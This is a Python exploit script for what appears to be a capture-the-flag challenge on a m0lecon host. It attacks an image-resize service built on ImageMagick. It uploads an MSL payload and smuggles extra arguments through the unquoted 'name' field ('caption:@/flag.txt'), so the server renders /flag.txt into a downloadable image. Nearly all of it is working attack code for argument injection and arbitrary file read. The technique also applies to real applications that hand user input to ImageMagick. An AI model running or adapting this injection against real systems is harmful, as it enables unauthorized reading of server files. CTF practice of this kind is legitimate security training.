#!/usr/bin/env python3
import requests
import base64
import time

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it/"

# Valid 1x1 PNG
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==')

# MSL payload that reads the flag
msl_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:@/flag.txt" />
<write filename="/tmp/flag.png" />
</image>'''

print("[*] Exploitation attempt...")
print("[*] The vulnerability: convert.sh uses unquoted variables")
print("[*] Command: convert $1 -resize 64x64 ... $2")
print("[*] We control $2 = static/<name>.png\n")

# Step 1: Upload MSL file first to get it on the filesystem
print("[1] Uploading MSL payload...")
r = requests.post(URL, 
    files={'img': ('payload.msl', msl_payload.encode(), 'text/plain')},
    data={'name': 'mslpayload'})
print(f"    Status: {r.status_code}")
time.sleep(1)

# Step 2: Now use a name that injects msl: protocol
# The trick: use spaces to inject additional arguments
# convert /tmp/phpXXX -resize 64x64 ... static/OUT.png msl:/tmp/phpYYY static/dummy.png
# This won't work directly, but we can try to inject the msl file path

# Better approach: inject label or caption protocol
print("\n[2] Trying to inject caption protocol...")
# Name with space to inject additional arguments
# Output becomes: static/x.png caption:@/flag.txt static/flagout.png
payload_name = "x.png caption:@/flag.txt static/flagout"

r = requests.post(URL,
    files={'img': ('dummy.png', png, 'image/png')},
    data={'name': payload_name})
print(f"    Status: {r.status_code}")
time.sleep(2)

# Try to retrieve the flag image
print("\n[3] Checking for output files...")
for filename in ['flagout.png', 'x.png']:
    r = requests.get(f"{URL}static/{filename}")
    print(f"    static/{filename}: {r.status_code}", end='')
    if r.status_code == 200:
        print(f" (size: {len(r.content)} bytes)")
        with open(filename, 'wb') as f:
            f.write(r.content)
        print(f"    Saved to {filename} - CHECK THIS FILE FOR THE FLAG!")
    else:
        print()

